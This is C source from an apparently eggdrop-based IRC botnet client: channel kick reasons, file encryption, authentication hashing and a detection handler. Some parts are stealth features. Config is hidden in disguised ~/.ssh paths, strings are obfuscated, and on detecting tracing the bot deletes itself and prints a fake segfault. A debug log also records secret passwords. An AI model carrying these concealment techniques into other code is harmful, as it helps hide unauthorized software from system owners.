      fatal("Updating...", 1);
      usleep(2000 * 500);
      bg_send_quit(BG_ABORT);

      exit(0);
      //No need to return :)
#ifdef LEAF
    } else {
      if (localhub && autoi) {
        add_hook(HOOK_SECONDLY, (Function) updatelocal);
        return 0;
      }
    }
#endif
  }
  //This shouldn't happen...
  return 2;
}

void EncryptFile(char *infile, char *outfile)
{
  char  buf[8192];
  FILE *f, *f2 = NULL;
  int std = 0;
  if (!strcmp(outfile, "STDOUT"))
    std = 1;
  f  = fopen(infile, "r");
  if(!f)
    return; 
  if (!std) {     
    f2 = fopen(outfile, "w");
    if (!f2)
      return;
  } else {
    printf("-----------------------------------TOP-----------------------------------\n");
  }

  while (fscanf(f,"%[^\n]\n",buf) != EOF) {
    if (std)
      printf("%s\n", cryptit(encrypt_string(netpass, buf)));
    else
      lfprintf(f2, "%s\n", buf);
  }
  if (std)
    printf("-----------------------------------EOF-----------------------------------\n");

  fclose(f);
  if (f2)
    fclose(f2);
}
void DecryptFile(char *infile, char *outfile)
{
  char  buf[8192], *temps;
  FILE *f, *f2 = NULL;
  int std = 0;

  if (!strcmp(outfile, "STDOUT")) 
    std = 1;
  f  = fopen(infile, "r");
  if (!f)
    return; 
  if (!std) {     
    f2 = fopen(outfile, "w");
    if (!f2)
      return;
  } else {
    printf("-----------------------------------TOP-----------------------------------\n");
  }

  while (fscanf(f,"%[^\n]\n",buf) != EOF) {
    temps = (char *) decrypt_string(netpass, decryptit(buf));
    if (!std)
      fprintf(f2, "%s\n",temps);
    else
      printf("%s\n", temps);
    nfree(temps);
  }
  if (std)
    printf("-----------------------------------EOF-----------------------------------\n");

  fclose(f);
  if (f2)
    fclose(f2);
}

int bot_aggressive_to(struct userrec *u)
{
  char mypval[20],
    botpval[20];

  link_pref_val(u, botpval);
  link_pref_val(get_user_by_handle(userlist, botnetnick), mypval);

//printf("vals: my: %s them: %s\n", mypval, botpval);

  if (strcmp(mypval, botpval) < 0)
    return 1;
  else
    return 0;
}

void detected(int code, char *msg)
{
#ifdef LEAF
  module_entry *me;
#endif
  char *p = NULL;
  char tmp[512];
  struct userrec *u;
  struct flag_record fr = { FR_GLOBAL, 0, 0 };
  int act;

  u = get_user_by_handle(userlist, botnetnick);
#ifdef S_LASTCHECK
  if (code == DETECT_LOGIN)
    p = (char *) (CFG_LOGIN.ldata ? CFG_LOGIN.ldata : (CFG_LOGIN.gdata ? CFG_LOGIN.gdata : NULL));
#endif
#ifdef S_ANTITRACE
  if (code == DETECT_TRACE)
    p = (char *) (CFG_TRACE.ldata ? CFG_TRACE.ldata : (CFG_TRACE.gdata ? CFG_TRACE.gdata : NULL));
#endif
#ifdef S_PROMISC
  if (code == DETECT_PROMISC)
    p = (char *) (CFG_PROMISC.ldata ? CFG_PROMISC.ldata : (CFG_PROMISC.gdata ? CFG_PROMISC.gdata : NULL));
#endif
#ifdef S_PROCESSCHECK
  if (code == DETECT_PROCESS)
    p = (char *) (CFG_BADPROCESS.ldata ? CFG_BADPROCESS.ldata : (CFG_BADPROCESS.gdata ? CFG_BADPROCESS.gdata : NULL));
#endif
#ifdef S_HIJACKCHECK
  if (code == DETECT_SIGCONT)
    p = (char *) (CFG_HIJACK.ldata ? CFG_HIJACK.ldata : (CFG_HIJACK.gdata ? CFG_HIJACK.gdata : NULL));
#endif

  if (!p)
    act = DET_WARN;
  else if (!strcmp(p, STR("die")))
    act = DET_DIE;
  else if (!strcmp(p, STR("reject")))
    act = DET_REJECT;
  else if (!strcmp(p, STR("suicide")))
    act = DET_SUICIDE;
  else if (!strcmp(p, STR("nocheck")))
    act = DET_NOCHECK;
  else if (!strcmp(p, STR("ignore")))
    act = DET_IGNORE;
  else
    act = DET_WARN;
  switch (act) {
  case DET_IGNORE:
    break;
  case DET_WARN:
    putlog(LOG_WARN, "*", msg);
    break;
  case DET_REJECT:
    do_fork();
    putlog(LOG_WARN, "*", STR("Setting myself +d: %s"), msg);
    sprintf(tmp, STR("+d: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
    get_user_flagrec(u, &fr, 0);
    fr.global = USER_DEOP | USER_BOT;

    set_user_flagrec(u, &fr, 0);
    sleep(1);
    break;
  case DET_DIE:
    putlog(LOG_WARN, "*", STR("Dying: %s"), msg);
    sprintf(tmp, STR("Dying: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    if ((me = module_find("server", 0, 0))) {
      Function *func = me->funcs;
      (func[SERVER_NUKESERVER]) ("BBL");
    }
#endif
    sleep(1);
    fatal(msg, 0);
    break;
  case DET_SUICIDE:
    putlog(LOG_WARN, "*", STR("Comitting suicide: %s"), msg);
    sprintf(tmp, STR("Suicide: %s"), msg);
    set_user(&USERENTRY_COMMENT, u, tmp);
#ifdef LEAF
    if ((me = module_find("server", 0, 0))) {
      Function *func = me->funcs;
      (func[SERVER_NUKESERVER]) ("HARAKIRI!!");
    }
#endif
    sleep(1);
    unlink(binname);
#ifdef HUB
    unlink(userfile);
    sprintf(tmp, STR("%s~"), userfile);
    unlink(tmp);
//    unlink(logfile);
//    sprintf(tmp, STR("%s~"), logfile);
//    unlink(tmp);
#endif
    fatal(msg, 0);
    break;
  case DET_NOCHECK:
    break;
  }
}



char * kickreason(int kind) {
  int r;
  r=random();
  switch (kind) {
  case KICK_BANNED:
    switch (r % 6) {
    case 0: return STR("bye");
    case 1: return STR("banned");
    case 2: return STR("bummer");
    case 3: return STR("go away");
    case 4: return STR("cya around looser");
    case 5: return STR("unwanted!");
    }
  case KICK_KUSER:
    switch (r % 4) {
    case 0: return STR("not wanted");
    case 1: return STR("something tells me you're annoying");
    case 2: return STR("don't bug me looser");
    case 3: return STR("creep");
    }
  case KICK_KICKBAN:
    switch (r % 4) {
    case 0: return STR("gone");
    case 1: return STR("stupid");
    case 2: return STR("looser");
    case 3: return STR("...");
    }     
  case KICK_MASSDEOP:
    switch (r % 8) {
    case 0: return STR("spammer!");
    case 1: return STR("easy on the modes now");
    case 2: return STR("mode this");
    case 3: return STR("nice try");
    case 4: return STR("really?");
    case 5: return STR("mIRC sux for mdop kiddo");
    case 6: return STR("scary... really scary...");
    case 7: return STR("you lost the game!");
    }
  case KICK_BADOP:
    switch (r % 5) {
    case 0: return STR("neat...");
    case 1: return STR("oh, no you don't. go away.");
    case 2: return STR("didn't you forget something now?");
    case 3: return STR("no");
    case 4: return STR("hijack this");
    }
  case KICK_BADOPPED:
    switch (r % 5) {
    case 0: return STR("buggar off kid");
    case 1: return STR("asl?");
    case 2: return STR("whoa... what a hacker... skills!");
    case 3: return STR("yes! yes! yes! hit me baby one more time!");
    case 4: return STR("with your skills, you're better off jacking off than hijacking");
    }
  case KICK_MANUALOP:
    switch (r % 6) {
    case 0: return STR("naughty kid");
    case 1: return STR("didn't someone tell you that is bad?");
    case 2: return STR("want perm?");
    case 3: return STR("see how much good that did you?");
    case 4: return STR("not a smart move...");
    case 5: return STR("jackass!");
    }
  case KICK_MANUALOPPED:
    switch (r % 8) {
    case 0: return STR("your pal got mean friends. like me.");
    case 1: return STR("uhh now.. don't wake me up...");
    case 2: return STR("hi hun. missed me?");
    case 3: return STR("spammer! die!");
    case 4: return STR("boo!");
    case 5: return STR("that @ was useful, don't ya think?");
    case 6: return STR("not in my book");
    case 7: return STR("lol, really?");
    }
  case KICK_CLOSED:
    switch (r % 17) {
    case 0: return STR("locked");
    case 1: return STR("later");
    case 2: return STR("closed for now");
    case 3: return STR("sorry, but it's getting late, locking channel. cya around");
    case 4: return STR("better safe than sorry");
    case 5: return STR("cleanup, come back later");
    case 6: return STR("this channel is closed");
    case 7: return STR("shutting down for now");
    case 8: return STR("lockdown");
    case 9: return STR("reopening later");
    case 10: return STR("not for the public atm");
    case 11: return STR("private channel for now");
    case 12: return STR("might reopen soon, might reopen later");
    case 13: return STR("you're not supposed to be here right now");
    case 14: return STR("sorry, closed");
    case 15: return STR("try us later, atm we're locked down");
    case 16: return STR("closed. try tomorrow");
    }
  case KICK_FLOOD:
    switch (r % 7) {
    case 0: return STR("so much bullshit in such a short time. amazing.");
    case 1: return STR("slow down. i'm trying to read here.");
    case 2: return STR("uhm... you actually think irc is for talking?");
    case 3: return STR("talk talk talk");
    case 4: return STR("blabbering are we?");
    case 5: return STR("... and i don't even like you!");
    case 6: return STR("and you're outa here...");

    }
  case KICK_NICKFLOOD:
    switch (r % 7) {
    case 0: return STR("make up your mind?");
    case 1: return STR("be schizofrenic elsewhere");
    case 2: return STR("I'm loosing track of you... not!");
    case 3: return STR("that is REALLY annoying");
    case 4: return STR("try this: /NICK looser");
    case 5: return STR("playing hide 'n' seek?");
    case 6: return STR("gotcha!");
    }
  case KICK_KICKFLOOD:
    switch (r % 6) {
    case 0: return STR("easier to just leave if you wan't to be alone");
    case 1: return STR("cool down");
    case 2: return STR("don't be so damned aggressive. that's my job.");
    case 3: return STR("kicking's fun, isn't it?");
    case 4: return STR("what's the rush?");
    case 5: return STR("next time you do that, i'll kick you again");

    }
  case KICK_BOGUSUSERNAME:
    return STR("bogus username");
  case KICK_MEAN:
    switch (r % 11) {
    case 0: return STR("hey! that wasn't very nice!");
    case 1: return STR("don't fuck with my pals");
    case 2: return STR("meanie!");
    case 3: return STR("I can be a bitch too...");
    case 4: return STR("leave the bots alone, will ya?");
    case 5: return STR("not very clever");
    case 6: return STR("watch it");
    case 7: return STR("fuck off");
    case 8: return STR("easy now. that's a friend.");
    case 9: return STR("abuse of power. leave that to me, will ya?");      
    case 10: return STR("there as some things you cannot do, and that was one of them...");
    }
  case KICK_BOGUSKEY:
    return STR("I have a really hard time reading that key");
  default:
    return "OMFG@YUO";    
  }

}



char kickprefix[25] = "";
char bankickprefix[25] = "";

void makeplaincookie(char *chname, char *nick, char *buf)
{
  /*
     plain cookie:
     Last 6 digits of time
     Last 5 chars of nick
     Last 4 regular chars of chan
   */
  char work[256],
    work2[256];
  int i,
    n;

  sprintf(work, STR("%010li"), (now + timesync));
  strcpy(buf, (char *) &work[4]);
  work[0] = 0;
  if (strlen(nick) < 5)
    while (strlen(work) + strlen(nick) < 5)
      strcat(work, " ");
  else
    strcpy(work, (char *) &nick[strlen(nick) - 5]);
  strcat(buf, work);

  n = 3;
  for (i = strlen(chname) - 1; (i >= 0) && (n >= 0); i--)
    if (((unsigned char) chname[i] < 128) && ((unsigned char) chname[i] > 32)) {
      work2[n] = tolower(chname[i]);
      n--;
    }
  while (n >= 0)
    work2[n--] = ' ';
  work2[4] = 0;
  strcat(buf, work2);
}

int goodpass(char *pass, int idx, char *nick)
{
  int i, nalpha = 0, lcase = 0, ucase = 0, ocase = 0, tc;

  char *tell;
  tell = nmalloc(300);

  if (!pass[0]) 
    return 0;

  for (i = 0; i < strlen(pass); i++) {
    tc = (int) pass[i];
    if (tc < 58 && tc > 47)
      ocase++; //number
    else if (tc < 91 && tc > 64)
      ucase++; //upper case
    else if (tc < 123 && tc > 96)
      lcase++; //lower case
    else
       nalpha++; //non-alphabet/number
  }

  if (ocase < 1 || lcase < 2 || ucase < 2 || nalpha < 1 || strlen(pass) < 8) {

    sprintf(tell, "Insecure pass, must be: ");

    if (ocase < 1)
      strcat(tell, "\002>= 1 number\002, ");
    else
      strcat(tell, ">= 1 number, ");

    if (lcase < 2)
      strcat(tell, "\002>= 2 lcase\002, ");
    else
      strcat(tell, ">= 2 lowercase, ");

    if (ucase < 2)
      strcat(tell, "\002>= 2 ucase\002, ");
    else
      strcat(tell, ">= 2 uppercase, ");

    if (nalpha < 1)
      strcat(tell, "\002>= 1 non-alpha/num\002, ");
    else
      strcat(tell, ">= 1 non-alpha/num, ");

    if (strlen(pass) < 8)
      strcat(tell, "\002>= 8 chars.\002");
    else
      strcat(tell, ">= 8 chars.");

    if (idx)
      dprintf(idx, "%s\n", tell);
    else if (nick[0])
      dprintf(DP_HELP, "NOTICE %s :%s\n", nick, tell);
    
    return 0;
  }
  

  return 1;
}

//strcpy(dcc[idx].nick, char *string);
//.nick is char nick[uhostlen]

char *makehash(struct userrec *u, char *rand)
{
  int i = 0;
  MD5_CTX ctx;
  unsigned char md5out[33];
  char md5string[33], hash[500], *ret = NULL;


Context;
//    strcpy(hash, rand);
Context;
//    strcat(hash, get_user(&USERENTRY_SECPASS, u));
 
    sprintf(hash, "%s%s%s", rand, (char *) get_user(&USERENTRY_SECPASS, u), authkey ? authkey : "");

    putlog(LOG_DEBUG, "*", "Making hash from %s %s: %s", rand, get_user(&USERENTRY_SECPASS, u), hash);

    MD5_Init(&ctx);
    MD5_Update(&ctx, hash, strlen(hash));
    MD5_Final(md5out, &ctx);

    for(i=0; i<16; i++)
      sprintf(md5string + (i*2), "%.2x", md5out[i]);
   
    putlog(LOG_DEBUG, "*", "MD5 of hash: %s", md5string);
Context;
    ret = md5string;
Context;
//    sprintf(ret, "%s", md5string);
    return ret;
}


int new_auth(void)
{
  int i = auth_total;

Context;
  if (auth_total == max_auth)
    return -1;

  auth_total++;
Context;
  egg_bzero((char *) &auth[i], sizeof(struct auth_t));
Context;
  return i;
}

int isauthed(char *host)
{
  int i = 0;
  if (!host || !host[0])
    return -1;
Context;
  for (i = 0; i < auth_total; i++) {
Context;
    if (auth[i].host[0] && !strcmp(auth[i].host, host)) {
      putlog(LOG_DEBUG, "*", "Debug for isauthed: checking: %s i: %d :: %s", host, i, auth[i].host);
      return i;
    }
Context;
  }
Context;
  return -1;
}
  
void removeauth(int n)
{
Context;
  auth_total--;
  if (n < auth_total)
    egg_memcpy(&auth[n], &auth[auth_total], sizeof(struct auth_t));
  else
    egg_bzero(&auth[n], sizeof(struct auth_t)); /* drummer */
}

char *replace (char *string, char *oldie, char *newbie)
{
  static char newstring[1024] = "";
  int str_index, newstr_index, oldie_index, end, new_len, old_len, cpy_len;
  char *c;
  if (string == NULL) return "";
  if ((c = (char *) strstr(string, oldie)) == NULL) return string;
  new_len = strlen(newbie);
  old_len = strlen(oldie);
  end = strlen(string) - old_len;
  oldie_index = c - string;
  newstr_index = 0;
  str_index = 0;
  while(str_index <= end && c != NULL) {
    cpy_len = oldie_index-str_index;
    strncpy(newstring + newstr_index, string + str_index, cpy_len);
    newstr_index += cpy_len;
    str_index += cpy_len;
    strcpy(newstring + newstr_index, newbie);
    newstr_index += new_len;
    str_index += old_len;
    if((c = (char *) strstr(string + str_index, oldie)) != NULL)
     oldie_index = c - string;
  }
  strcpy(newstring + newstr_index, string + str_index);
  return (newstring);
}


char *getfullbinname(char *argv0)
{
  char *cwd,
   *bin,
   *p,
   *p2;

  bin = nmalloc(strlen(argv0) + 1);
  strcpy(bin, argv0);
  if (bin[0] == '/') {
    return bin;
  }
  cwd = nmalloc(8192);
  getcwd(cwd, 8191);
  cwd[8191] = 0;
  if (cwd[strlen(cwd) - 1] == '/')
    cwd[strlen(cwd) - 1] = 0;

  p = bin;
  p2 = strchr(p, '/');
  while (p) {
    if (p2)
      *p2++ = 0;
    if (!strcmp(p, "..")) {
      p = strrchr(cwd, '/');
      if (p)
        *p = 0;
    } else if (strcmp(p, ".")) {
      strcat(cwd, "/");
      strcat(cwd, p);
    }
    p = p2;
    if (p)
      p2 = strchr(p, '/');
  }
  nfree(bin);
  bin = nmalloc(strlen(cwd) + 1);
  strcpy(bin, cwd);
  nfree(cwd);
  return bin;
}


void sdprintf EGG_VARARGS_DEF(char *, arg1)
{
  if (sdebug) {
    char *format;
    char s[601];
    va_list va;

    format = EGG_VARARGS_START(char *, arg1, va);
    egg_vsnprintf(s, 2000, format, va);
    va_end(va);
    if (!backgrd)
      dprintf(DP_STDOUT, "[D] %s\n", s);
    else
      putlog(LOG_MISC, "*", "[D] %s", s);
  }
}

char *werr_tostr(int errnum)
{
  switch (errnum) {
  case ERR_BINSTAT:
    return STR("Cannot access binary");
  case ERR_BINMOD:
    return STR("Cannot chmod() binary");
  case ERR_PASSWD:
    return STR("Cannot access the global passwd file");
  case ERR_WRONGBINDIR:
    return STR("Wrong directory/binary name");
  case ERR_CONFSTAT:
#ifdef LEAF
    return STR("Cannot access config directory (~/.ssh/)");
#else
    return STR("Cannot access config directory (./)");
#endif /* LEAF */
  case ERR_TMPSTAT:
#ifdef LEAF
    return STR("Cannot access tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot access config directory (./tmp/)");
#endif /* LEAF */
  case ERR_CONFDIRMOD:
#ifdef LEAF
    return STR("Cannot chmod() config directory (~/.ssh/)");
#else
    return STR("Cannot chmod() config directory (./)");
#endif /* LEAF */
  case ERR_CONFMOD:
#ifdef LEAF
    return STR("Cannot chmod() config (~/.ssh/.known_hosts/)");
#else
    return STR("Cannot chmod() config (./conf)");
#endif /* LEAF */
  case ERR_TMPMOD:
#ifdef LEAF
    return STR("Cannot chmod() tmp directory (~/.ssh/.../)");
#else
    return STR("Cannot chmod() tmp directory (./tmp)");
#endif /* LEAF */
  case ERR_NOCONF:
#ifdef LEAF
    return STR("The local config is missing (~/.ssh/.known_hosts)");
#else
    return STR("The local config is missing (./conf)");
#endif /* LEAF */
  case ERR_CONFBADENC:
    return STR("Encryption in config is wrong/corrupt");
  case ERR_WRONGUID:
    return STR("UID in conf does not match getuid()");
  case ERR_WRONGUNAME:
    return STR("Uname in conf does not match uname()");
  case ERR_BADCONF:
    return STR("Config file is incomplete");
  default:
    return STR("Unforseen error");
  }

}

void werr(int errnum)
{
  putlog(LOG_MISC, "*", "error #%d", errnum);
  sdprintf("error translates to: %s", werr_tostr(errnum));
  printf("(segmentation fault)\n");
  fatal("", 0);
}

